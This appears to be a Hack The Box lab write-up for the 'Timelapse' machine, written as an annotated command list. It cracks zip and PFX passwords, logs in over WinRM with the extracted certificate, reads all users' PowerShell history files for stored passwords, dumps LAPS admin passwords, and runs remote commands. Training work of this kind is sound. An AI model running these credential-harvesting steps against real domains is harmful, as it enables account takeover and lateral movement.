# HTB: [Timelapse](https://www.hackthebox.com/machines/timelapse)
# Walkthrough: https://youtu.be/DmP292z1Gks

```bash
#############################################
# 0️⃣ Files & assets
#############################################
# Provided:
# - no_auth_smb => shares + usernames => winrm.zip

#############################################
# 1️⃣ Zip: extract john hash + crack
#############################################
zip2john winrm.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john hash.txt --show
# cracked: supremelegacy
unzip -P 'supremelegacy' winrm.zip
# or: 7z x -p'supremelegacy' winrm.zip

#############################################
# 2️⃣ PFX: extract john hash + crack
#############################################
pfx2john legacy.pfx > pfx_hash
john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash
john pfx_hash --show
# legacyy: thuglegacy

#############################################
# 3️⃣ PFX -> PEM for cert auth
#############################################

### Tryied certipy...dead end ###
certipy auth -pfx legacy.pfx -password thuglegacy -dc-ip $IP -username legacyy

openssl pkcs12 -in legaccy_dev_auth.pfx -out pub.pem -clcerts
openssl pkcs12 -in legaccy_dev_auth.pfx -out priv.pem -cacerts

# ensure WinRM reachable and port
nmap -p 5985,5986 -sV -Pn $IP
curl -v http://$IP:5985/wsman || curl -k -v https://$IP:5986/wsman

evil-winrm -i $ip $domain -c pub.pem -k priv.pem -S  


#############################################
# 8️Credentials discovered & pivot
#############################################
# we enum in program files and see laps, we saw that at the beggining as well.
# users found via net users: sinfulz, babywyrm, svc_deploy
# We check the history and see svc_deploy with his pass
gc (Get-PSReadLineOption).HistorySavePath; type $Env:UserProfile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt; foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

# LAPS discovered via ldap module
nxc ldap $IP -u svc_deploy -p $pass -M laps

nxc smb $IP -u usernames.txt -p 'the pass we get from laps' -X 'whoami'

```
